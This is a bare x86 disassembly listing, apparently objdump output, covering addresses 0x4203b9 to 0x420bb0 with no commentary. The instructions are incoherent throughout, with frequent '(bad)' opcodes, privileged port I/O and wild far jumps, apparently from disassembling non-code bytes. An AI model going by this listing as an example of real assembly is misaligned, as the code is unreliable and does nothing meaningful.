  4203b9:	outs   dx,DWORD PTR ds:[esi]
  4203ba:	dec    edx
  4203bb:	xchg   DWORD PTR [edi+0x416fed53],edi
  4203c1:	sti    
  4203c2:	hlt    
  4203c3:	mov    ebx,0xa92cfff3
  4203c8:	call   FWORD PTR [ecx-0x6c]
  4203cb:	mov    ah,0x62
  4203cd:	lods   eax,DWORD PTR ds:[esi]
  4203ce:	push   cs
  4203cf:	adc    al,0x83
  4203d1:	mov    ds:0xf74c097,al
  4203d6:	leave  
  4203d7:	lods   al,BYTE PTR ds:[esi]
  4203d8:	mov    edi,0xfd586624
  4203dd:	sbb    si,WORD PTR [ebx+eax*1-0x3]
  4203e2:	arpl   WORD PTR [esi-0x5c],dx
  4203e5:	add    al,0xb6
  4203e7:	sbb    DWORD PTR [ecx+0x2],0xffffffd0
  4203eb:	or     bh,al
  4203ed:	ja     0x420417
  4203ef:	jmp    0xbc21909d
  4203f4:	dec    ebp
  4203f5:	mov    eax,0x1cb16328
  4203fa:	(bad)  
  4203fb:	sar    dh,0x85
  4203fe:	push   edi
  4203ff:	or     DWORD PTR [edi],0x9
  420402:	inc    ebp
  420403:	stc    
  420404:	xchg   edi,eax
  420405:	jecxz  0x420414
  420407:	jle    0x420473
  420409:	push   ds
  42040a:	dec    ecx
  42040b:	mov    esp,0xccbbc166
  420410:	and    eax,DWORD PTR gs:[edx]
  420413:	mov    DWORD PTR [ebp-0x3d],0x3422d31f
  42041a:	outs   dx,BYTE PTR ds:[esi]
  42041b:	stos   DWORD PTR es:[edi],eax
  42041c:	int3   
  42041d:	sbb    DWORD PTR [eax+0x5b],esi
  420420:	int    0x1
  420422:	inc    DWORD PTR ds:0x8f30ce85
  420428:	jmp    0x420406
  42042a:	jae    0x4203ba
  42042c:	inc    cl
  42042e:	lea    esi,[ecx+0x1b06d6cd]
  420434:	push   ecx
  420435:	sub    BYTE PTR [ecx+0x63],0x6c
  420439:	loopne 0x420488
  42043b:	or     ebx,DWORD PTR [edx-0x19]
  42043e:	pop    ss
  42043f:	popf   
  420440:	sbb    DWORD PTR ds:0xc92370cf,ebp
  420446:	mov    ds:0x263bec31,eax
  42044b:	jne    0x420403
  42044d:	out    0xe0,eax
  42044f:	daa    
  420450:	sbb    DWORD PTR [esi],ebx
  420452:	inc    ebx
  420453:	dec    ebp
  420454:	adc    edx,DWORD PTR [edx+0x58e61b0]
  42045a:	jecxz  0x42041a
  42045c:	int    0x2f
  42045e:	fwait
  42045f:	sahf   
  420460:	adc    eax,0xa5d5843
  420465:	fidiv  WORD PTR ds:0x18600316
  42046b:	outs   dx,DWORD PTR ds:[esi]
  42046c:	cmp    eax,DWORD PTR [ebx-0x18c2cad0]
  420472:	ss cld 
  420474:	pop    ecx
  420475:	outs   dx,BYTE PTR ds:[esi]
  420476:	push   ecx
  420477:	test   DWORD PTR [ebx-0x7b],esi
  42047a:	add    eax,0xb681a070
  42047f:	mov    ecx,0x4feb5833
  420484:	mov    cl,0xb1
  420486:	cmp    bh,BYTE PTR [ecx]
  420488:	jmp    0x9fa169ef
  42048d:	stc    
  42048e:	loop   0x42044a
  420490:	push   eax
  420491:	jp     0x420511
  420493:	mov    eax,0x42fa329a
  420498:	sub    edi,ebp
  42049a:	and    al,0xdf
  42049c:	mov    ch,0x76
  42049e:	iret   
  42049f:	and    BYTE PTR [eax-0x376e5a80],al
  4204a5:	dec    ecx
  4204a6:	(bad)  
  4204a7:	pop    edx
  4204a8:	loopne 0x420524
  4204aa:	add    eax,0x49dc8c5c
  4204af:	and    eax,0xbe899f26
  4204b4:	shl    BYTE PTR [eax+0x47d91b34],1
  4204ba:	sub    eax,0xfdf5ee15
  4204bf:	adc    ebp,edx
  4204c1:	js     0x420455
  4204c3:	or     DWORD PTR [eax-0x5d33a81f],esi
  4204c9:	cs jne 0x4204f0
  4204cc:	jmp    0xf9bddb39
  4204d1:	xchg   ebx,eax
  4204d2:	les    eax,FWORD PTR [ecx+0x13988562]
  4204d8:	call   0xc51852e1
  4204dd:	jecxz  0x42047c
  4204df:	push   ds
  4204e0:	pop    edx
  4204e1:	mov    al,0xab
  4204e3:	xlat   BYTE PTR ds:[ebx]
  4204e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204e5:	push   esp
  4204e6:	jmp    0x420553
  4204e8:	lahf   
  4204e9:	repnz outs dx,BYTE PTR ds:[esi]
  4204eb:	jnp    0x420507
  4204ed:	jno    0x4204b7
  4204ef:	cwde   
  4204f0:	pop    ebp
  4204f1:	loop   0x420559
  4204f3:	jns    0x420475
  4204f5:	dec    ecx
  4204f6:	rol    DWORD PTR [ecx-0xb29d046],0xc0
  4204fd:	adc    eax,0x929bf885
  420502:	jo     0x420557
  420504:	retf   0x32e3
  420507:	mov    ds:0x6370eb03,eax
  42050c:	adc    esp,DWORD PTR [ebx-0x4a]
  42050f:	pusha  
  420510:	pop    edx
  420511:	shl    DWORD PTR [ecx-0x1d],0x54
  420515:	sbb    al,0x6e
  420517:	icebp  
  420518:	pushf  
  420519:	call   0x4c61f6e6
  42051e:	sbb    BYTE PTR [esi],dl
  420520:	push   ds
  420521:	adc    BYTE PTR [edx],ch
  420523:	mov    esp,0x3da170b4
  420528:	push   ds
  420529:	jnp    0x4204bd
  42052b:	test   eax,0x6cf5b327
  420530:	bound  esp,QWORD PTR [esi-0x5a78abbe]
  420536:	lds    ecx,FWORD PTR [edi]
  420538:	xor    ebx,DWORD PTR [ecx+eiz*2+0xd7744c5]
  42053f:	sbb    DWORD PTR [edx+0x2a001b9c],ecx
  420545:	pop    ebx
  420546:	push   DWORD PTR [eax]
  420548:	mov    dh,0x2d
  42054a:	sahf   
  42054b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42054c:	stc    
  42054d:	mov    ds:0x9e32aa62,eax
  420552:	fxam   
  420554:	push   ss
  420555:	xor    BYTE PTR [eax],al
  420557:	pop    ebx
  420558:	push   ebx
  420559:	out    0x45,eax
  42055b:	sub    BYTE PTR [ebp+0x38a1c931],dh
  420561:	scas   al,BYTE PTR es:[edi]
  420562:	jnp    0x420567
  420564:	add    ebp,DWORD PTR [ebp-0x385823b0]
  42056a:	lods   al,BYTE PTR ds:[esi]
  42056b:	int    0x76
  42056d:	push   ds
  42056e:	lahf   
  42056f:	pop    ebp
  420570:	popa   
  420571:	adc    BYTE PTR [esp+ecx*1-0x45],dl
  420575:	aas    
  420576:	stos   DWORD PTR es:[edi],eax
  420577:	pop    ecx
  420578:	lds    eax,FWORD PTR [eax+eiz*4-0x632e85bd]
  42057f:	xchg   esp,eax
  420580:	inc    edx
  420581:	dec    edi
  420582:	xor    ebp,DWORD PTR [ecx+0x68c7504]
  420588:	ret    0xf4fe
  42058b:	cs adc ecx,edi
  42058e:	popf   
  42058f:	neg    DWORD PTR [esi]
  420591:	or     al,0xce
  420593:	push   ecx
  420594:	pop    edx
  420595:	sub    DWORD PTR [esi-0x54],0x0
  420599:	lock mov DWORD PTR [esp+ebx*4+0x35],ebx
  42059e:	or     dh,bl
  4205a0:	daa    
  4205a1:	int3   
  4205a2:	in     eax,0x8f
  4205a4:	jbe    0x4205e1
  4205a6:	ficomp WORD PTR [eax+ebx*1+0x41]
  4205aa:	sar    BYTE PTR [eax],0x11
  4205ad:	out    0x49,eax
  4205af:	repz mov dh,0xe4
  4205b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205b3:	xor    BYTE PTR [ecx+0x2b9a43ca],cl
  4205b9:	jns    0x42062e
  4205bb:	pusha  
  4205bc:	inc    esp
  4205bd:	iret   
  4205be:	pushf  
  4205bf:	xchg   esi,eax
  4205c0:	out    0x76,al
  4205c2:	sbb    BYTE PTR [ebx+0x14],cl
  4205c5:	out    dx,eax
  4205c6:	sbb    BYTE PTR [esi],dl
  4205c8:	arpl   WORD PTR [ebx+0x13],sp
  4205cb:	mov    esi,0xb13681d5
  4205d0:	rcr    ecx,0xa9
  4205d3:	int    0x45
  4205d5:	enter  0x248d,0x34
  4205d9:	add    DWORD PTR [ebx+0x75],ebp
  4205dc:	call   0x1f29:0xaf518043
  4205e3:	push   0x70
  4205e5:	enter  0xb417,0xbf
  4205e9:	inc    esi
  4205ea:	inc    ebp
  4205eb:	addr16 mov bh,0x6f
  4205ef:	pop    ds
  4205f0:	test   BYTE PTR [ebx+0x2a620566],ch
  4205f6:	xlat   BYTE PTR ds:[ebx]
  4205f7:	add    ecx,edx
  4205f9:	xchg   al,bh
  4205fb:	in     eax,0xb1
  4205fd:	jne    0x420589
  4205ff:	sbb    bh,BYTE PTR [esi]
  420601:	cdq    
  420602:	stc    
  420603:	aaa    
  420604:	adc    DWORD PTR [edx],esp
  420606:	sub    eax,0xdedc067
  42060b:	pop    ds
  42060c:	mov    eax,0x50d1fc62
  420611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420612:	inc    edx
  420613:	jecxz  0x4205d2
  420615:	(bad)  
  420616:	cmp    ch,BYTE PTR [ebx+0x5d750913]
  42061c:	repz jno 0x42069b
  42061f:	sbb    cl,BYTE PTR [ebp-0x2d]
  420622:	push   es
  420623:	push   ecx
  420624:	in     eax,0x6b
  420626:	mov    esi,0x1c67814d
  42062b:	pusha  
  42062c:	or     DWORD PTR [ecx+0xd4212cc],0x69
  420633:	(bad)  
  420635:	push   ecx
  420636:	daa    
  420637:	mov    bl,0xfb
  420639:	mov    edi,0x15d8db27
  42063e:	dec    esp
  42063f:	xchg   edx,eax
  420640:	shr    dh,1
  420642:	(bad)  
  420643:	push   ecx
  420644:	dec    ebp
  420645:	mov    esi,0xf5156e4e
  42064a:	out    dx,eax
  42064b:	mov    ds:0x933c2706,eax
  420650:	jg     0x420662
  420652:	cmp    eax,0x883554a1
  420657:	out    0x91,al
  420659:	in     eax,0x9d
  42065b:	add    DWORD PTR [edx+ebp*1],esi
  42065e:	vsubss xmm4,xmm6,DWORD PTR [ebp+0x4b7c49a0]
  420667:	lods   eax,DWORD PTR ds:[esi]
  420668:	das    
  420669:	les    ecx,FWORD PTR [ebx+0x605a5a48]
  42066f:	idiv   BYTE PTR fs:[edi+edi*1-0xd]
  420674:	loop   0x42065c
  420676:	and    al,0xfc
  420678:	in     eax,dx
  420679:	leave  
  42067a:	int3   
  42067b:	mov    ecx,0xe5284365
  420680:	(bad)  
  420681:	mov    bl,0xb6
  420683:	mov    esp,0x424ce779
  420688:	inc    edi
  420689:	add    ebp,0xe4b53662
  42068f:	push   ebp
  420690:	ret    0x3ee5
  420693:	popa   
  420694:	retf   
  420695:	and    eax,0x25f09799
  42069a:	and    BYTE PTR [edi-0x7e0917d7],cl
  4206a0:	scas   eax,DWORD PTR es:[edi]
  4206a1:	or     al,0xf1
  4206a3:	inc    esp
  4206a4:	or     eax,0xc7cce290
  4206a9:	push   edi
  4206aa:	cmp    eax,0xdbcaedfc
  4206af:	mov    bh,0xf7
  4206b1:	scas   al,BYTE PTR es:[edi]
  4206b2:	gs iret 
  4206b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b5:	and    ecx,0x6f0e0c8d
  4206bb:	pop    ebx
  4206bc:	add    al,0xb
  4206be:	push   ebx
  4206bf:	out    0xe,eax
  4206c1:	mov    ebp,DWORD PTR [eax-0x8101257]
  4206c7:	daa    
  4206c8:	pop    ebx
  4206c9:	jno    0x4206db
  4206cb:	push   edx
  4206cc:	inc    edx
  4206cd:	xchg   esp,eax
  4206ce:	sti    
  4206cf:	das    
  4206d0:	mov    dl,0xff
  4206d2:	sub    BYTE PTR [eax-0x33],0x73
  4206d6:	jne    0x4206e0
  4206d8:	leave  
  4206d9:	pop    ecx
  4206da:	repz inc eax
  4206dc:	or     eax,0xe22712b7
  4206e1:	cwde   
  4206e2:	sub    ch,BYTE PTR [ecx+0x71c31f98]
  4206e8:	mov    ebx,0xe68c659e
  4206ed:	aas    
  4206ee:	outs   dx,BYTE PTR es:[esi]
  4206f0:	mov    bl,0xd3
  4206f2:	jno    0x4206b9
  4206f4:	mov    BYTE PTR [edx-0x40fe6248],cl
  4206fa:	inc    ecx
  4206fb:	cmp    DWORD PTR [ecx-0x58],ebp
  4206fe:	sbb    eax,0x8dd5d22d
  420703:	ror    DWORD PTR [ecx-0x44],0x3
  420707:	loopne 0x4206fc
  420709:	in     eax,0xe8
  42070b:	add    edx,ecx
  42070d:	in     eax,dx
  42070e:	jg     0x4206de
  420710:	push   0xffffffaa
  420712:	shr    ch,0xdb
  420715:	pop    esi
  420716:	mov    edx,0xdb014573
  42071b:	lahf   
  42071c:	aas    
  42071d:	lahf   
  42071e:	or     ebx,DWORD PTR [eax-0x1fed5d4c]
  420724:	inc    ebp
  420725:	retf   0x8c27
  420728:	cmp    eax,0xf11b23cc
  42072d:	mov    al,0xf9
  42072f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420730:	xor    DWORD PTR [eax-0x62],esi
  420733:	jo     0x420735
  420735:	imul   esp,DWORD PTR [ebx-0x68c5e1ec],0x680ca877
  42073f:	push   ss
  420740:	mov    dh,0x47
  420742:	cld    
  420743:	xchg   edi,eax
  420744:	bound  esi,QWORD PTR [eax-0x4b4e3ee4]
  42074a:	sti    
  42074b:	add    al,ah
  42074d:	push   esi
  42074e:	call   ebx
  420750:	cld    
  420751:	mov    esi,0xed9e4627
  420756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420757:	xchg   ebp,eax
  420758:	jle    0x420775
  42075a:	mov    edi,edx
  42075c:	pop    esi
  42075d:	stc    
  42075e:	xchg   DWORD PTR [ebp+edx*1+0x22fe5351],edi
  420765:	cwde   
  420766:	fisttp WORD PTR [eax]
  420768:	sub    al,0xb4
  42076a:	lods   al,BYTE PTR ds:[esi]
  42076b:	mov    edx,0x7b1adf63
  420770:	mov    dh,BYTE PTR [eax-0x2bbe890d]
  420776:	mov    DWORD PTR [edx],ecx
  420778:	and    esi,DWORD PTR [edx]
  42077a:	inc    ebp
  42077b:	inc    esp
  42077c:	mov    DWORD PTR ds:0x1eed869f,ebx
  420782:	mov    bl,BYTE PTR [ebx-0x46]
  420785:	in     al,dx
  420786:	mov    edi,0x55170ac7
  42078b:	mov    ds:0xfd3877fe,eax
  420790:	add    esi,DWORD PTR [esp+ebp*4+0x29368707]
  420797:	add    ch,BYTE PTR [edi+0x23]
  42079a:	or     eax,0x86c40302
  42079f:	pop    ebp
  4207a0:	std    
  4207a1:	jae    0x4207dd
  4207a3:	xchg   BYTE PTR [eax+0x2f],ch
  4207a6:	sbb    DWORD PTR [edx-0x41],ecx
  4207a9:	lods   eax,DWORD PTR ds:[esi]
  4207aa:	shl    BYTE PTR [edi+0x4f9b7830],1
  4207b0:	sbb    al,BYTE PTR [ecx-0x72e80a2]
  4207b6:	ret    
  4207b7:	jecxz  0x42079f
  4207b9:	and    eax,0x85594a21
  4207be:	mov    esp,gs
  4207c0:	mov    dh,0xc1
  4207c2:	fs dec edx
  4207c4:	sbb    al,0x9a
  4207c6:	stos   DWORD PTR es:[edi],eax
  4207c7:	jmp    0x104:0x75047b63
  4207ce:	mov    dh,0x51
  4207d0:	jbe    0x42082e
  4207d2:	mov    ebx,DWORD PTR [eax-0x6a]
  4207d5:	jns    0x420810
  4207d7:	pusha  
  4207d8:	sub    ebx,DWORD PTR [edi+0x5bdf3458]
  4207de:	mov    WORD PTR [edi],ds
  4207e0:	jno    0x42082c
  4207e2:	clc    
  4207e3:	mov    ds:0xbe05ad46,eax
  4207e8:	adc    al,0x19
  4207ea:	js     0x420825
  4207ec:	outs   dx,BYTE PTR ds:[esi]
  4207ed:	push   es
  4207ee:	jb     0x42078b
  4207f0:	push   esi
  4207f1:	and    BYTE PTR [ecx-0x22a76ea6],al
  4207f7:	dec    edi
  4207f8:	aaa    
  4207f9:	xchg   WORD PTR [ecx+0x70],sp
  4207fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fe:	retf   
  4207ff:	fisubr WORD PTR [edx+0x5a]
  420802:	stc    
  420803:	jge    0x4207dc
  420805:	mov    bl,0xa0
  420807:	mov    ch,0x8b
  420809:	xchg   ecx,eax
  42080a:	leave  
  42080b:	enter  0x6d84,0x42
  42080f:	jge    0x420862
  420811:	and    ebx,esi
  420813:	jge    0x4207c1
  420815:	repz mov esi,0x54ddf75d
  42081b:	jmp    0x94e6aab5
  420820:	clc    
  420821:	daa    
  420822:	mov    ebp,ebp
  420824:	mov    edx,0xa6568a06
  420829:	gs js  0x4207e5
  42082c:	pop    ds
  42082d:	stc    
  42082e:	cmp    ah,BYTE PTR ds:0xec21bad
  420834:	lock cs ret 0xf1f9
  420839:	pop    ds
  42083a:	pop    ebp
  42083b:	adc    eax,0xba51410
  420840:	xchg   edx,eax
  420841:	repnz addr16 out dx,eax
  420844:	je     0x420822
  420846:	pop    ecx
  420847:	ret    
  420848:	popf   
  420849:	test   DWORD PTR [ebx+esi*1-0x76],eax
  42084d:	mov    cl,0xf0
  42084f:	xchg   ecx,eax
  420850:	adc    eax,0x7afbf005
  420855:	mov    edi,0x733711d5
  42085a:	xchg   BYTE PTR [eax+0x1fa84625],ah
  420860:	add    DWORD PTR ds:0x4fb50bcf,eax
  420866:	std    
  420867:	xchg   edx,eax
  420868:	push   ss
  420869:	xchg   ecx,eax
  42086a:	mov    BYTE PTR ds:0xdea6c185,bl
  420870:	dec    esp
  420871:	xchg   DWORD PTR [ebx],esi
  420873:	mov    ecx,0x9fa30d5c
  420878:	dec    esp
  420879:	or     al,BYTE PTR [edx]
  42087b:	dec    eax
  42087c:	dec    edi
  42087d:	or     ebp,esp
  42087f:	fidivr WORD PTR [edx-0x5ece6c68]
  420885:	adc    cl,BYTE PTR [ecx-0x6c0dd9]
  42088b:	pop    eax
  42088c:	ds enter 0x5a60,0x79
  420891:	push   cs
  420892:	push   edx
  420893:	pop    edx
  420894:	jge    0x420835
  420896:	addr16 inc eax
  420898:	aas    
  420899:	out    dx,eax
  42089a:	jl     0x4208b8
  42089c:	cli    
  42089d:	test   DWORD PTR [eax-0x21],ecx
  4208a0:	jg     0x420845
  4208a2:	lock or DWORD PTR [eax-0x3317a77f],0xffffff90
  4208aa:	pop    esp
  4208ab:	out    dx,eax
  4208ac:	sub    edx,DWORD PTR [edx-0x4e873175]
  4208b2:	in     eax,0x2
  4208b4:	inc    edi
  4208b5:	jnp    0x4208c4
  4208b7:	push   eax
  4208b8:	jmp    0x420936
  4208ba:	in     eax,0x8e
  4208bc:	cmp    BYTE PTR [edx-0x1d],dl
  4208bf:	inc    ebp
  4208c0:	bound  eax,QWORD PTR [esi]
  4208c2:	add    al,0x2d
  4208c4:	pusha  
  4208c5:	jle    0x4208df
  4208c7:	popa   
  4208c8:	or     eax,edx
  4208ca:	out    0xd0,al
  4208cc:	nop
  4208cd:	mov    eax,ds:0xb6172012
  4208d2:	sub    DWORD PTR [edi],esp
  4208d4:	sbb    DWORD PTR [edi+0x62f92be4],eax
  4208da:	pop    ss
  4208db:	je     0x420906
  4208dd:	xchg   edi,eax
  4208de:	dec    edx
  4208df:	push   edi
  4208e0:	cdq    
  4208e1:	das    
  4208e2:	stc    
  4208e3:	adc    eax,0x97489424
  4208e8:	mov    BYTE PTR [eax+edx*4+0x4dd675e2],cl
  4208ef:	or     bh,BYTE PTR [edx]
  4208f1:	sub    ch,BYTE PTR [ebx-0x12]
  4208f4:	retf   0x1052
  4208f7:	and    DWORD PTR [ecx-0x8],ebp
  4208fa:	adc    al,0xb3
  4208fc:	pusha  
  4208fd:	rcr    DWORD PTR [eax-0x67],1
  420900:	inc    ecx
  420901:	cmovae esp,DWORD PTR [esi]
  420904:	mov    esi,0xa4bf6ef3
  420909:	xor    ch,BYTE PTR [eax-0x33188eb5]
  42090f:	inc    edx
  420910:	push   0x90283600
  420915:	xor    eax,0x5667dd99
  42091a:	push   edi
  42091b:	add    eax,0xa866a3ab
  420920:	jecxz  0x4208ce
  420922:	fsub   st(7),st
  420924:	sar    DWORD PTR [eax+0x7a],1
  420927:	mov    ebp,ebx
  420929:	and    ch,0x2c
  42092c:	xchg   edi,eax
  42092d:	retf   0x4fb9
  420930:	mov    bh,0x4
  420932:	xchg   ebx,eax
  420933:	outs   dx,DWORD PTR ds:[esi]
  420934:	pop    esp
  420935:	push   edx
  420936:	or     DWORD PTR [edi],ebp
  420938:	mov    ds:0x61cad372,eax
  42093d:	xchg   ebp,ebp
  42093f:	inc    eax
  420940:	or     esp,DWORD PTR [edx+0x41]
  420943:	sbb    cl,bl
  420945:	fadd   st(6),st
  420947:	sbb    al,0xb5
  420949:	sbb    cl,BYTE PTR [edx]
  42094b:	xchg   edx,eax
  42094c:	xor    bh,BYTE PTR [edi-0x1a]
  42094f:	icebp  
  420950:	cmp    eax,0x3147325b
  420955:	mov    dh,0x65
  420957:	nop
  420958:	mov    bl,0x15
  42095a:	psrlw  mm3,QWORD PTR [edx]
  42095d:	test   BYTE PTR [esi],dh
  42095f:	lds    edx,FWORD PTR [ecx-0x25d97eec]
  420965:	dec    ebx
  420966:	and    bl,dh
  420968:	ret    0x453f
  42096b:	xchg   edi,eax
  42096c:	xor    ecx,0x6f56209
  420972:	lds    ebx,FWORD PTR [ebp-0x40]
  420975:	xchg   esp,eax
  420976:	dec    esp
  420977:	or     ebx,DWORD PTR [ebx+0x26]
  42097a:	sbb    al,0xe2
  42097c:	xchg   BYTE PTR [edx-0x5b],cl
  42097f:	test   esi,ebx
  420981:	dec    esi
  420982:	std    
  420983:	enter  0x3fdf,0x48
  420987:	mov    esi,0x8d942d0
  42098c:	enter  0x8edc,0xc8
  420990:	cmp    BYTE PTR [ebp+0x66],bl
  420993:	fsubr  QWORD PTR [edx+0x6]
  420996:	mov    al,ds:0x47b44ed3
  42099b:	xchg   ebp,eax
  42099c:	out    dx,eax
  42099d:	or     al,BYTE PTR ss:[ebx]
  4209a0:	jo     0x4209c7
  4209a2:	push   esi
  4209a3:	cmp    ch,al
  4209a5:	xchg   BYTE PTR [ecx-0x1d],cl
  4209a8:	popf   
  4209a9:	in     al,dx
  4209aa:	pop    ss
  4209ab:	xor    DWORD PTR [edi+0x2f78bb98],0x72
  4209b2:	mov    dh,0xa3
  4209b4:	add    DWORD PTR [eax-0x9],edx
  4209b7:	mov    al,ds:0x73d9a20b
  4209bc:	sub    DWORD PTR [ebx-0x2d],0xe284530f
  4209c3:	push   esp
  4209c4:	jge    0x4209b9
  4209c6:	sbb    BYTE PTR [eax+0x78],cl
  4209c9:	call   0x3bb85582
  4209ce:	pop    esi
  4209cf:	pop    eax
  4209d0:	sub    BYTE PTR [esi+0x5e],ah
  4209d3:	data16 cld 
  4209d5:	or     esp,esi
  4209d7:	mov    edi,?
  4209d9:	into   
  4209da:	pop    ss
  4209db:	inc    esi
  4209dc:	bswap  esp
  4209de:	into   
  4209df:	imul   esp,DWORD PTR [ecx+0x9729c13],0xa2846fca
  4209e9:	fsub   DWORD PTR [ecx+ebp*2-0x2e]
  4209ed:	pop    ebx
  4209ee:	imul   esi,DWORD PTR [ecx+0x13c7a487],0xe975e1c5
  4209f8:	add    cl,ah
  4209fa:	aaa    
  4209fb:	fist   DWORD PTR [edi-0x6ebeed54]
  420a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a02:	inc    esi
  420a03:	bound  ebx,QWORD PTR [esi+0x38edf0a4]
  420a09:	scas   al,BYTE PTR es:[edi]
  420a0a:	repz sar BYTE PTR [esi],0x66
  420a0e:	les    ebx,FWORD PTR [edx]
  420a10:	push   0xfdad38cf
  420a15:	fwait
  420a16:	fwait
  420a17:	loop   0x42099a
  420a19:	out    0x27,eax
  420a1b:	into   
  420a1c:	mov    ebx,0xec02877d
  420a21:	pushf  
  420a22:	xchg   edx,eax
  420a23:	mov    ah,BYTE PTR [edx-0x1a736387]
  420a29:	mov    ecx,0x6efc213d
  420a2e:	jmp    FWORD PTR [edx-0x30]
  420a31:	and    eax,edi
  420a33:	daa    
  420a34:	xacquire xchg BYTE PTR [esi],bl
  420a37:	inc    ebx
  420a38:	sbb    al,0x50
  420a3a:	mov    bh,ch
  420a3c:	dec    esp
  420a3d:	cld    
  420a3e:	scas   al,BYTE PTR es:[edi]
  420a3f:	stos   DWORD PTR es:[edi],eax
  420a40:	mov    ebx,0x197d362e
  420a45:	out    dx,al
  420a46:	(bad)  
  420a48:	push   es
  420a49:	int    0xaf
  420a4b:	pop    ss
  420a4c:	stos   DWORD PTR es:[edi],eax
  420a4d:	dec    esi
  420a4e:	js     0x420a8e
  420a50:	sub    ecx,DWORD PTR [ebp-0x40]
  420a53:	iret   
  420a54:	in     eax,0x28
  420a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a57:	sub    bl,al
  420a59:	push   0xffffffd8
  420a5b:	jno    0x420a1d
  420a5d:	sub    al,BYTE PTR [edi]
  420a5f:	cmp    esp,DWORD PTR [eax-0x26534f4f]
  420a65:	mov    eax,0xdd456e41
  420a6a:	out    0x79,eax
  420a6c:	stc    
  420a6d:	cmp    al,0x84
  420a6f:	mov    eax,ds:0x692118fe
  420a74:	into   
  420a75:	xlat   BYTE PTR ds:[ebx]
  420a76:	adc    al,0x99
  420a78:	mov    BYTE PTR [edi],dh
  420a7a:	(bad)  
  420a7b:	(bad)  [ebx+ebx*2]
  420a7e:	pop    esp
  420a7f:	xchg   ebp,eax
  420a80:	inc    edx
  420a81:	lock jns 0x420a22
  420a84:	loopne 0x420ad4
  420a86:	ficomp WORD PTR [edx+0x2ab8c097]
  420a8c:	stos   BYTE PTR es:[edi],al
  420a8d:	enter  0xad1,0x69
  420a91:	add    al,0xfe
  420a93:	mov    ds:0xb7def618,al
  420a98:	mov    ebp,DWORD PTR [eax-0x9100169]
  420a9e:	add    esp,DWORD PTR [ecx+0x1ec343db]
  420aa4:	retf   
  420aa5:	es jmp 0x4ac8:0x190328fa
  420aad:	data16 cs cmc 
  420ab0:	lds    esp,FWORD PTR [ecx+0x34]
  420ab3:	mov    DWORD PTR [edi-0x47b351fe],edi
  420ab9:	(bad)  
  420aba:	jnp    0x420b00
  420abc:	mov    eax,0xdcf4ab15
  420ac1:	ins    DWORD PTR es:[edi],dx
  420ac2:	fisub  WORD PTR [ebp+0x47]
  420ac5:	aaa    
  420ac6:	mov    ah,0x1f
  420ac8:	popa   
  420ac9:	push   0x68
  420acb:	shl    BYTE PTR [ebx-0x149d7010],cl
  420ad1:	mov    eax,0x2d5ba6ad
  420ad6:	pusha  
  420ad7:	lock push eax
  420ad9:	std    
  420ada:	es add ebp,0xffffff9c
  420ade:	iret   
  420adf:	pop    ds
  420ae0:	mov    ebp,0xf769b0f2
  420ae5:	repz mov ecx,0x94323510
  420aeb:	ret    
  420aec:	test   al,0xeb
  420aee:	add    BYTE PTR [esi],cl
  420af0:	push   0xffffff9f
  420af2:	lahf   
  420af3:	scas   eax,DWORD PTR es:[edi]
  420af4:	jmp    0x98460e36
  420af9:	and    esi,edi
  420afb:	mov    ds:0x2ae4ad40,al
  420b00:	cmp    BYTE PTR [ebp-0x39],dh
  420b03:	cmp    ecx,eax
  420b05:	adc    eax,0x4a33b513
  420b0a:	sbb    al,0xe
  420b0c:	xor    esi,esp
  420b0e:	inc    eax
  420b0f:	xchg   edi,eax
  420b10:	int    0xba
  420b12:	sub    esp,0xffffffda
  420b15:	iret   
  420b16:	sbb    bl,BYTE PTR [edx+edi*4-0x7b]
  420b1a:	outs   dx,BYTE PTR ds:[esi]
  420b1b:	sub    eax,0x95d5005
  420b20:	sbb    DWORD PTR [esi-0x9],edx
  420b23:	inc    ecx
  420b24:	push   ss
  420b25:	pop    esp
  420b26:	mov    ebx,0xe30c2ad6
  420b2b:	xor    ecx,0xf7671bca
  420b31:	in     al,0x7
  420b33:	scas   al,BYTE PTR es:[edi]
  420b34:	cmp    DWORD PTR [esi],ebx
  420b36:	mov    edi,0x57ad2551
  420b3b:	jmp    0x5c7f:0xcea56aed
  420b42:	pop    esi
  420b43:	adc    eax,0xa
  420b46:	xchg   edx,eax
  420b47:	pop    esp
  420b48:	or     dh,BYTE PTR [edx-0x2f]
  420b4b:	in     al,0x24
  420b4d:	out    0xe1,eax
  420b4f:	int    0x18
  420b51:	jecxz  0x420ae5
  420b53:	mov    ds:0x7de1ab45,eax
  420b58:	or     ebx,DWORD PTR [eax+esi*2-0x7ea33c14]
  420b5f:	iret   
  420b60:	sub    eax,0x8320bba6
  420b65:	inc    esp
  420b66:	mov    WORD PTR [eax-0x221d7c5c],gs
  420b6c:	loope  0x420b35
  420b6e:	into   
  420b6f:	pop    edi
  420b70:	jp     0x420bd8
  420b72:	es iret 
  420b74:	iret   
  420b75:	mov    eax,0x1bbb40f7
  420b7a:	cmp    al,0xa6
  420b7c:	xor    eax,0x47b813ec
  420b81:	repz pop eax
  420b83:	repz sub dl,cl
  420b86:	fstp   st(3)
  420b88:	xchg   DWORD PTR [esi],esp
  420b8a:	call   0x28dda4d5
  420b8f:	jg     0x420ba3
  420b91:	jg     0x420b5a
  420b93:	xchg   esp,eax
  420b94:	xchg   BYTE PTR [ebx],cl
  420b96:	dec    esi
  420b97:	loop   0x420b6c
  420b99:	xor    al,0xf6
  420b9b:	inc    esi
  420b9c:	sbb    esi,DWORD PTR [ebx]
  420b9e:	jle    0x420bfa
  420ba0:	ret    
  420ba1:	dec    edx
  420ba2:	mov    bh,0x3d
  420ba4:	cdq    
  420ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba6:	pop    esi
  420ba7:	in     al,0xb
  420ba9:	rcr    DWORD PTR [edi+0x59],cl
  420bac:	dec    eax
  420bad:	sub    BYTE PTR [eax],bh
  420baf:	inc    ebx
  420bb0:	cmp    bh,BYTE PTR [ebp+ebp*2+0x503f1312]
